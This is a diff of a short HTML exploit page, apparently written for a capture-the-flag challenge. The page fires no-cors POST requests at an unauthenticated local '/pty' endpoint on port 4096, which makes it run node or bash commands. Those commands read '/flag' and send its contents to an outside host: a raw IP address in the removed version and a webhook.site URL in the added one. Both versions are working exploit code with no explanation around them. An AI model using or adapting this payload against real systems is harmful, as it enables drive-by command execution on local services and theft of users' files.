@@ -1,48 +1,22 @@
-  <!doctype html>
-  <meta charset="utf-8">
-  <script>
-  const WEBHOOK = "http://47.118.30.30:9999";
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        const TARGET_URL = 'http://127.0.0.1:4096/pty';
+        const WEBHOOK = 'https://webhook.site/6c7b9fec-12ce-4d1c-b5ce-5938576168f4';
 
-  const nodeCode = `
-  (async () => {
-    const fs = require("fs");
-    try { fs.chmodSync("/flag", 0o644); } catch {}
-    let out = "";
-    try { out = fs.readFileSync("/flag", "utf8"); }
-    catch (e) { out = "ERR:" + String(e); }
-    try {
-      await fetch(${JSON.stringify("http://47.118.30.30:9999")}, {
-        method: "POST",
-        body: out
-      });
-    } catch {}
-    process.exit(0);
-  })();
-  `;
+        // The command uses Node.js to read the file and send it out via fetch
+        const cmd = `node -e "fetch('${WEBHOOK}?flag=' + encodeURIComponent(require('fs').readFileSync('/flag', 'utf8')))"`;
 
-  const body = JSON.stringify({
-    command: "node",
-    args: ["-e", nodeCode],
-    cwd: "/"
-  });
-
-  async function fire(base) {
-    try {
-      await fetch(base + "/pty", {
-        method: "POST",
-        mode: "no-cors",
-        headers: { "Content-Type": "text/plain;charset=UTF-8" },
-        body
-      });
-    } catch {}
-  }
-
-  (async () => {
-    const end = Date.now() + 15000;
-    while (Date.now() < end) {
-      await fire("http://127.0.0.1:4096");
-      await fire("http://localhost:4096");
-      await new Promise(r => setTimeout(r, 300));
-    }
-  })();
-  </script>
+        fetch(TARGET_URL, {
+            method: 'POST',
+            mode: 'no-cors', // Bypasses preflight for this unauthenticated endpoint
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                command: '/bin/bash',
+                args: ['-c', cmd]
+            })
+        }).then(() => console.log("Payload Sent"));
+    </script>
+</body>
+</html>
